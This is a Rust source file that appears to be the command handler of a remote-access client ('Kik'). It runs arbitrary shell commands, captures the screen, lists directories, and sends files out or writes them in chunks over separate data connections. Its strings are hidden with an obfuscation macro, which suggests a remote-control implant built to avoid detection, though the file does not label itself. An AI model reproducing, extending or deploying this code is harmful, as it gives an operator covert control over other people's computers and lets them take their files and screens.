use crate::context::Context;
use crate::{cmd_util, screen};
use common::command::{Command, CtrlCommand};
use common::file_util;
use common::hidden;
use common::message::dok::Dok;
use common::message::dok::Dok::FilePart;
use common::message::kik_cmd_resp_info;
use common::message::kik_resp::{
    kik_error, kik_success_big_file, kik_success_data_id, kik_success_info, KikResp,
};
use common::protocol::BufSerializable;
use std::path::{Path, PathBuf};
use tokio::fs;
use tokio::io::AsyncWriteExt;
use tokio::sync::oneshot;
use tokio::task::JoinSet;
use tokio_stream::StreamExt;
use uuid::Uuid;

pub struct RunOutcome {
    response: KikResp,
    transfer_start: Option<oneshot::Sender<()>>,
}

impl RunOutcome {
    pub(crate) fn immediate(response: KikResp) -> Self {
        Self {
            response,
            transfer_start: None,
        }
    }

    fn deferred(response: KikResp, transfer_start: oneshot::Sender<()>) -> Self {
        Self {
            response,
            transfer_start: Some(transfer_start),
        }
    }

    pub fn split(self) -> (KikResp, Option<oneshot::Sender<()>>) {
        (self.response, self.transfer_start)
    }
}

pub async fn run(context: &Context, cmd: Command) -> RunOutcome {
    match cmd {
        Command::Ctrl(c) => {
            let resp = match c {
                CtrlCommand::GetFile(file_path, _) => {
                    match file_util::read_file_limited(file_path, file_util::MAX_INLINE_FILE_BYTES)
                        .await
                    {
                        Ok(v) => match context.find_and_send_data(&v).await {
                            Ok(data_id) => {
                                return RunOutcome::immediate(kik_success_data_id(data_id));
                            }
                            Err(e) => kik_error(hidden!("Kik发送数据失败,error:", e)),
                        },
                        Err(e) => kik_error(hidden!("Kik读取文件失败:", e)),
                    }
                }
                CtrlCommand::GetBigFile(file_path, _) => {
                    return prepare_get_big_file(context, file_path).await;
                }
                CtrlCommand::SetBigFile(data_id, total, hash, save_path) => {
                    match set_big_file(context, data_id, total, hash, save_path.clone()).await {
                        Ok(_) => kik_success_info(hidden!("保存大文件至Kik:", save_path, "成功")),
                        Err(e) => {
                            kik_error(hidden!("保存大文件至Kik:", save_path, "失败,error:", e))
                        }
                    }
                }
                CtrlCommand::SetFile(data_id, save_path) => {
                    //recv data
                    match context.read_data(&data_id).await {
                        Ok(data) => {
                            //save_path
                            match file_util::save_file(save_path.as_str(), &data).await {
                                Ok(_) => {
                                    kik_success_info(hidden!("保存文件至Kik:", save_path, "成功"))
                                }
                                Err(e) => kik_error(hidden!(
                                    "保存文件至Kik:",
                                    save_path,
                                    "失败,error:",
                                    e
                                )),
                            }
                        }
                        Err(e) => kik_error(e.to_string()),
                    }
                }
                CtrlCommand::Ls(s) => {
                    let args: Vec<&str> = s.split_ascii_whitespace().collect();
                    match (match args.as_slice() {
                        [path, arg, ..] => {
                            if *arg == hidden!("-r") {
                                file_util::ls(*path, true)
                            } else {
                                file_util::ls(*path, false)
                            }
                        }
                        _ => file_util::ls(s.as_str(), false),
                    })
                    .await
                    .and_then(|v| {
                        Ok(serde_json::to_string(
                            &v.into_iter()
                                .map(|(filename, is_file, size, created_date, modified_date)| {
                                    kik_cmd_resp_info::Ls {
                                        size,
                                        filename,
                                        is_file,
                                        created_date,
                                        modified_date,
                                    }
                                })
                                .collect::<Vec<kik_cmd_resp_info::Ls>>(),
                        )?)
                    }) {
                        Ok(json) => kik_success_info(json),
                        Err(e) => kik_error(e.to_string()),
                    }
                }
                CtrlCommand::Screen(_) => {
                    let request = screen::CaptureRequest::png(screen::PngProfile::Balanced);
                    match screen::capture_screen(request).await {
                        Ok(v) => match context.find_and_send_data(&v).await {
                            Ok(data_id) => {
                                return RunOutcome::immediate(kik_success_data_id(data_id));
                            }
                            Err(e) => kik_error(hidden!("Kik发送数据失败,error:", e)),
                        },
                        Err(e) => kik_error(hidden!("Kik截屏失败,error:", e)),
                    }
                }
            };
            RunOutcome::immediate(resp)
        }
        Command::Exec(s) => RunOutcome::immediate(
            match cmd_util::cmd_exec_line(s.as_str(), false, true).await {
                Ok(res) => kik_success_info(res),
                Err(e) => kik_error(hidden!("cmd exec error:", e)),
            },
        ),
        _ => RunOutcome::immediate(kik_error(hidden!("暂不支持该类型消息"))),
    }
}

async fn prepare_get_big_file(context: &Context, file_path: String) -> RunOutcome {
    let prepared =
        match file_util::prepare_big_file(&file_path, file_util::FILE_TRANSFER_CHUNK_BYTES).await {
            Ok(value) => value,
            Err(error) => {
                return RunOutcome::immediate(kik_error(hidden!("准备文件传输失败,error:", error)))
            }
        };
    let file_size = prepared.size;
    let hash = prepared.hash;
    let stream = prepared.stream;

    if context.find_data_conn().await.is_none() {
        return RunOutcome::immediate(kik_error(hidden!("Kik数据连接未初始化完成")));
    }
    let data_id = Uuid::new_v4().to_string();
    let response = kik_success_big_file(data_id.clone(), file_size, hash);
    let send_context = context.clone();
    let (start_tx, start_rx) = oneshot::channel();
    tokio::spawn(async move {
        // 控制响应成功写出后才开始数据流，避免消费者尚未知晓 data_id 时占满有界队列。
        if start_rx.await.is_err() {
            return;
        }
        let transfer = match tokio::time::timeout(
            file_util::FILE_TRANSFER_TIMEOUT,
            send_big_file_parts(send_context.clone(), data_id.clone(), stream),
        )
        .await
        {
            Ok(result) => result,
            Err(_) => Err((
                common::message::dok::ErrCode::ReadError,
                anyhow::Error::msg(hidden!("大文件发送超过 4 小时总时限")),
            )),
        };
        if let Err((code, _error)) = transfer {
            dev_debug!("大文件发送失败: {_error}");
            let encoded = Dok::Err(code).to_buf();
            let _ = send_context.send_data_with_id(&data_id, &encoded).await;
        }
    });
    RunOutcome::deferred(response, start_tx)
}

async fn set_big_file(
    context: &Context,
    data_id: String,
    total: u64,
    hash: Vec<u8>,
    save_path: String,
) -> anyhow::Result<()> {
    if total > file_util::MAX_BIG_FILE_BYTES {
        return Err(anyhow::Error::msg(hidden!("暂不支持 1 GiB 以上的大文件")));
    }
    if hash.len() != 32 {
        return Err(anyhow::Error::msg(hidden!("SHA-256 长度必须为 32 bytes")));
    }
    let destination = PathBuf::from(&save_path);
    let parent = destination.parent().unwrap_or_else(|| Path::new("."));
    fs::create_dir_all(parent).await?;
    // 接收文件统一落到系统临时目录；随机名与 create_new 共同阻止路径预测和覆盖。
    let (temp_file_path, temp_file) = file_util::create_random_temp_file().await?;
    if let Err(error) = temp_file.set_len(total).await {
        drop(temp_file);
        // 预分配也可能因空间不足而失败；此路径尚未进入统一接收循环，必须就地清理。
        let _ = fs::remove_file(&temp_file_path).await;
        return Err(error.into());
    }

    let result = match tokio::time::timeout(
        file_util::FILE_TRANSFER_TIMEOUT,
        receive_big_file(
            context,
            &data_id,
            total,
            &hash,
            temp_file,
            &temp_file_path,
            &destination,
        ),
    )
    .await
    {
        Ok(result) => result,
        Err(_) => Err(anyhow::Error::msg(hidden!("大文件上传超过 4 小时总时限"))),
    };
    if result.is_err() {
        if let Err(_cleanup_error) = fs::remove_file(&temp_file_path).await {
            dev_debug!(
                "清理失败的大文件临时文件失败: path={}, error={}",
                temp_file_path.display(),
                _cleanup_error
            );
        }
    }
    result
}

async fn receive_big_file(
    context: &Context,
    data_id: &str,
    total: u64,
    hash: &[u8],
    mut temp_file: fs::File,
    temp_file_path: &Path,
    destination: &Path,
) -> anyhow::Result<()> {
    let mut tracker = file_util::FileRangeTracker::new(total)?;
    let mut write_cursor = 0_u64;

    while !tracker.complete() {
        let data = context.read_data(data_id).await?;
        let dok = Dok::from_buf(data)
            .ok_or_else(|| anyhow::Error::msg(hidden!("大文件数据格式错误!")))?;
        match dok {
            FilePart(start, end, data) => {
                if tracker.register(start, end, data.len())?
                    == file_util::FileRangeRegistration::New
                {
                    file_util::write_range(&mut temp_file, &mut write_cursor, start, end, &data)
                        .await?;
                }
            }
            Dok::Err(code) => {
                return Err(anyhow::Error::msg(hidden!(
                    "发送端报告大文件传输失败: ",
                    common::string_obfuscation::debug(&code)
                )))
            }
        }
    }
    temp_file.flush().await?;
    temp_file.sync_all().await?;
    if !hash.eq(&file_util::compute_open_file_hash(&mut temp_file).await?) {
        return Err(anyhow::Error::msg(hidden!("hash校验失败，数据错误")));
    }
    drop(temp_file);
    file_util::commit_temp_file(temp_file_path, destination).await?;
    Ok(())
}

/// 使用有界并发把分片分散到多条数据连接。
/// 出错后先排空已经开始的写任务，禁止取消半帧写入后继续复用同一 TCP 流。
async fn send_big_file_parts(
    context: Context,
    data_id: String,
    mut stream: file_util::FileChunkStream,
) -> Result<(), (common::message::dok::ErrCode, anyhow::Error)> {
    use common::message::dok::ErrCode;

    let mut pending = JoinSet::new();
    let mut source_exhausted = false;
    let mut failure = None;

    loop {
        while failure.is_none()
            && !source_exhausted
            && pending.len() < file_util::FILE_TRANSFER_IN_FLIGHT_PARTS
        {
            match stream.next().await {
                Some(Ok((range, data))) => {
                    let encoded = match Dok::encode_file_part(
                        range.start,
                        range.end.saturating_sub(1),
                        &data,
                    ) {
                        Ok(encoded) => encoded,
                        Err(error) => {
                            failure = Some((ErrCode::ReadError, error.into()));
                            continue;
                        }
                    };
                    let (send_context, send_data_id) = (context.clone(), data_id.clone());
                    pending.spawn(async move {
                        send_context
                            .send_data_with_id(&send_data_id, &encoded)
                            .await
                    });
                }
                Some(Err(error)) => failure = Some((ErrCode::ReadError, error.into())),
                None => source_exhausted = true,
            }
        }

        if pending.is_empty() {
            break;
        }
        match pending.join_next().await {
            Some(Ok(Ok(()))) => {}
            Some(Ok(Err(error))) => {
                failure.get_or_insert((ErrCode::WriteError, error));
            }
            Some(Err(error)) => {
                failure.get_or_insert((ErrCode::WriteError, error.into()));
            }
            None => break,
        }
    }

    match failure {
        Some(error) => Err(error),
        None if source_exhausted => Ok(()),
        None => Err((
            ErrCode::ReadError,
            anyhow::Error::msg(hidden!("文件分片流意外结束")),
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::run;
    use crate::context::Context;
    use common::command::Command;
    use common::message::kik_resp::{ClientSuccessResp, KikResp};
    #[tokio::test]
    async fn exec_is_available_in_default_build() {
        let (response, transfer_start) = run(
            &Context::new(),
            Command::Exec("echo rtc-exec-default".to_string()),
        )
        .await
        .split();
        assert!(transfer_start.is_none());

        match response {
            KikResp::Success(ClientSuccessResp::Info(output)) => {
                assert!(output.contains("rtc-exec-default"));
            }
            other => panic!("默认构建 Exec 返回了异常响应: {other:?}"),
        }
    }
}
